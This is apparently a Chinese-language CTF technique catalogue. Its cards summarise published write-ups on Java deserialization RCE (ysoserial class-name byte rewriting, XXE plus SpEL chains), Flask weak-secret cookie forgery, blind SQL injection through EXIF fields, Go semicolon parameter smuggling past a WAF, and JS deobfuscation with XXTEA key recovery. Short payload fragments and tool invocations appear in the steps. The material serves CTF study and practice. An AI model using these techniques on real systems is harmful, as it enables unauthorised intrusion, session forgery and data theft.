- **验证步骤**：1) 反编译 war 定制 OIS 白名单；2) 自造类 writeObject 注入 XXE payload 读 key；3) 受限接口组 SpEL（T() 类方法 + && 短路缝合）；4) 旗从异常栈回显。
- **判定标准**：PASS = 两段链打通取旗；FAIL = 白名单挡 gadget → 找白名单类自身 gadget；SpEL 版本限制 T() → 转其他表达式上下文。
- **裁决词**：待复跑
- **来源**：TrendMicro CTF 2019 Quals Exploit 300（300p）｜p4（波兰战队）｜raw/github-repos/p4/*.md（两段 payload 全文在 WP；本地 Tomcat 可重放）

### Flask 弱密钥枚举会话伪造（字典 secret 离线爆破）
- **分层**：困难档·弱随机
- **假设**：`app.secret_key = random.choice(已知短语列表)` → 会话 cookie 签名可用候选字典离线爆破（flask-unsign --unsign --wordlist）→ 命中后离线重签 admin 字段伪造会话 → 拿旗。
- **验证步骤**：1) 读源码（题面附）确认 secret 生成池；2) flask-unsign 解 cookie；3) 字典枚举命中 key；4) 重签 admin cookie 提交。
- **判定标准**：PASS = 伪造会话通过；FAIL = secret 高熵 → 转服务端会话/其他注入面。
- **裁决词**：待复跑
- **来源**：picoCTF 2021 Most Cookies（web 150p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（完整脚本在 WP；本地 Flask 同构秒级重放）
- **关联**：与 [[游戏状态存 Flask cookie（rarity=0 取旗不可能 → 离线解码）]] 互补——解码侧 vs 伪造侧（弱密钥条件）

### EXIF 元数据注入 SQL（盲注 rlike 面板）
- **分层**：困难档·复合链
- **假设**：文件上传后服务端把 EXIF `Software` 字段直接拼进 SQL（rlike 检索）且回显搜索结果面板 ⇒ exiftool 写入注入串（`$'+...(substring...)+'` 型），每次上传即一次盲注查询，按结果面板内容逐位还原旗。
- **验证步骤**：1) 上传带合法 EXIF 的图确认字段入库；2) exiftool -Software= 注入 rlike 布尔判别式；3) 观察面板命中与否逐位爆破；4) 拼旗。
- **判定标准**：PASS = 面板差分可判且拼出旗；FAIL = 字段长度截断 → 缩短 payload 或改注释内联。
- **裁决词**：待复跑
- **来源**：KLCTF 2017 web200（DCCTF-finals）｜六星战队（中国）｜raw/github-repos/sixstars/2017_dcctf_h_web200.md（注入模板与逐位脚本在 WP；本地 MySQL 同构可重放）
- **关联**：与 [[sqlmap 基线用法]] 的通道差——注入面在上传文件元数据而非请求参数（sqlmap 盲扫覆盖不到的「二次注入」形态）。

### Go 版本差异参数走私（ParseThru 绕 WAF 取文件）
- **分层**：困难档·复合链
- **假设**：反向代理（Go 1.17+，`;` 不再是查询分隔符）与后端（旧 Go，`;` 仍作参数分隔）解析差异 ⇒ WAF 按 1.17+ 语义看不到 `file` 参数、后端按旧语义收到 `?;file=flag.txt` → 直接取到后端文件读取接口的旗。
- **验证步骤**：1) 指纹定前后端 Go 版本（报错页/响应头）；2) 构造 `?;file=…` 走私参数；3) 命中后端读取接口直取 flag.txt；4) 失败则试 `#`/`&` 变体与 URL 编码变体。
- **判定标准**：PASS = 走私参数抵达后端读出旗；FAIL = 后端同版本 → 转路径穿越/其他代理层差异。
- **裁决词**：待复跑
- **来源**：IntentCTF 2022 Go through the hole（web）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2022_go-through-the-hole-md_h_go-through-the-hole.md（Go 1.17 release note 引证与请求构造在 WP；本地双版本反代可重放）
- **关联**：与 [[SSRF 打云 metadata 与内网]] 同「代理层语义差」族——关键差异 = 该条打协议解析差、SSRF 打可达域，走私对象都是「中间件看不见的请求」。

### JS 混淆还原 + XXTEA 密钥提取（字符串映射表归一化）
- **分层**：困难档·复合链
- **假设**：flag 校验藏在前端 flag.js 混淆（0x 十六进制变量名 + 字符串映射函数 + 语义乱序）⇒ DevTools Console 多次执行确认 `_0x2c9e` 为纯 string mapping → 手动替换归一化 → 按上下文重命名变量 → 还原出 `String.prototype.encrypt(key_str)` 的 XXTEA 结构（escape 预处理 + Str4ToLong 键组）→ 从邻近常量提 key，逆向解密回 flag。
- **验证步骤**：1) hex 变量转十进制对齐；2) Console 执行映射函数生成对照表并全文替换；3) 识别 XXTEA 加密结构（4 字节分组轮函数）；4) 提取 key 串；5) 反向解密。
- **判定标准**：PASS = 解密输出可读旗；FAIL = key 为动态生成 → 在解密前先 hook encrypt 截获明文。
- **裁决词**：待复跑
- **来源**：Hackergame 2021 23-minecRaft（web）｜USTC-Hackergame（官方+选手，monad）｜raw/github-repos/hackergame2021/2021_hackergame_h_23-minecraft-md.md（还原后代码与解密脚本在 WP；纯前端本地重放）
- **关联**：与 [[反编译工具链优先级]] 的 JS 侧对偶——「先归一化命名再读逻辑」同纪律；[[逆向问答链：strcmp 常量答案 → 常量变换 → RC4 资源口令]] 的 web 壳版本。

### Java 反序列化 RCE（ysoserial 载荷类名改写）
- **分层**：困难档·经典原语
- **假设**：服务端 `/jail` 端点 ObjectInputStream 直接反序列化用户 POST 体且 classpath 有 commons-collections-3.1 ⇒ ysoserial CommonsCollections 链可用，但目标类（Flag）与应用包名不匹配——生成载荷后按流内长度前缀改写字节串（`\x17ysoserial.payloads.Flag` → `\x18com.trendmicro.jail.Flag`）即可落进目标类的静态块执行取旗。
- **验证步骤**：1) jar 反编译确认 gadget 与目标类全名；2) ysoserial 生成载荷；3) Python 按类名长度前缀替换字节；4) POST 提交收旗。
- **判定标准**：PASS = 反序列化触发读旗动作；FAIL = 目标类不可直达 → 转其他 gadget 链。
- **裁决词**：待复跑
- **来源**：Trend Micro CTF 2018 misc-300（misc 300p/37 解）｜Balsn（战队）｜raw/github-repos/balsn/slices/20180914-trendmicroctf/misc-300.md（Server.java 与载荷改写脚本在 WP；本地 tomcat+jar 可重放）
- **关联**：[[Java XMLDecoder 签名文件反序列化 RCE]] 的姊妹原语——XMLDecoder 直接执行 vs ObjectInputStream gadget 链，公共前提都是「类路径含已知 gadget 库」。
- **陷阱备注**：Q1 归位说明——按反序列化实类归 web（选材线记 reverse 系合集归类）；类名长度前缀（首字节）必须同步改，否则流解析错位。
